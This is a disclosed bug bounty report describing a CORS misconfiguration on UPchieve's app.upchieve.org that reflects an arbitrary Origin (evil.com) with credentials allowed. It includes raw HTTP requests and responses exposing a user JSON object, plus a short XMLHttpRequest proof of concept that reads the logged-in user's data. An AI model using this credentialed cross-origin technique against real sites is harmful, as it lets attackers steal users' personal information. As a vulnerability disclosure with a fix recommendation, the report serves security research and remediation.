# Cross-origin resource sharing misconfig | steal user information 

## Report Details
- **Report ID**: 1183601
- **URL**: https://hackerone.com/reports/1183601
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-05-04T11:26:39.002Z
- **Disclosed**: 2021-06-15T16:58:21.998Z

## Reporter
- **Username**: n1had
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: upchieve

## Vulnerability Information
## Summary

An HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.
Trusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.
If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.

#POC1

#Ruquested .

1- 

```javascript

GET /api/user HTTP/1.1
Host: app.upchieve.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate

```
2- we can add `Origin: evil.com`

```javascript

GET /api/user HTTP/1.1
Host: app.upchieve.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: evil.com
```

#Response

```javascript

HTTP/1.1 200 OK
Date: Tue, 04 May 2021 11:21:25 GMT
Content-Type: application/json; charset=utf-8
Connection: close
x-powered-by: Express
access-control-allow-origin: evil.com


{"user":{"_id":"6088429736785e00232c57de","verified":true,"verifiedEmail":true,"verifiedPhone":false,"isVolunteer":false,"isAdmin":false,"isBanned":true,"isTestUser":false,"isFakeUser":false,"isDeactivated":false,"pastSessions":["609069b08b925400233afeb7"],"type":"Student","firstname":"sfsf","lastname":"dfe","email":"2c5a43ddb7@firemailbox.club","zipCode":"77777","approvedHighschool":"5f6273fa7674f035e46b6af0","createdAt":"2021-04-27T16:57:59.882Z","lastActivityAt":"2021-05-03T21:22:08.243Z","referralCode":"YIhClzZ4XgAjLFfe","__v":0}}

```
#POC2

1- open https://example.com in browser then inspect the page and go to console.
2- run the following code in console and you would find it pops up user information

```

<html>
<script>
var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://app.upchieve.org/api/user',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
</script>
</html>

```
Open above code in any browser and you would find it pops up user information like the attachment.


#How To Fix

Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.

## Impact

Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server

## Attachments
- crossdomain.JPG
- cross.html
